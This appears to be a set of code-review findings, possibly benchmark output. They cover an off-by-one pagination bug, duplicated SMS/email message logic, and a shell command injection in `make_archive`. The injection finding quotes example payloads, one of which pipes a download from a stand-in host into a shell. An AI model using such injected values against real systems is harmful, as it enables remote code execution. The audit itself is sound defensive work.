produced_findings.claim: `page()` returns `page_size + 1` items per page `end = offset + page_size + 1` followed by `items[offset:end]`. The slice length is `page_size + 1` whenever enough items remain. The pre-image used `offset + page_size`. Each page returns one more item than requested. With `page_size=10`, page 1 returns items 0–10, and page 2 starts at offset 10, so item 10 appears on both pages. Callers get duplicated items and oversized pages.

SMS branch duplicates the email branch's message-building logic The new `elif kind == "sms"` branch repeats `msg = format_message(user)` from the `email` branch (`app/notify.py:3`). The two branches differ only in the recipient field and the send function. Each new channel will copy the same preamble again. Any change to message construction, such as per-channel formatting or error handling, has to be made in every branch, and the branches can drift apart.

Command injection through `name` in `make_archive` Line 5 builds `cmd = f"tar -czf {name}.tar.gz data/"` and line 6 runs it with `subprocess.run(cmd, shell=True, check=True)`. The shell parses `name` as command syntax, and nothing validates or quotes it. For example, `name="x; id #"` or `name="$(curl evil|sh)"` runs the injected command. The previous version passed `name + ".tar.gz"` as a single argv element with no shell, so it was not exposed to this. Anyone who can influence `name` can execute arbitrary commands with the privileges of the application process. That means remote code execution, data exfiltration of `data/`, and tampering with the backups. Spaces or other metacharacters in `name` would also break the archive path.
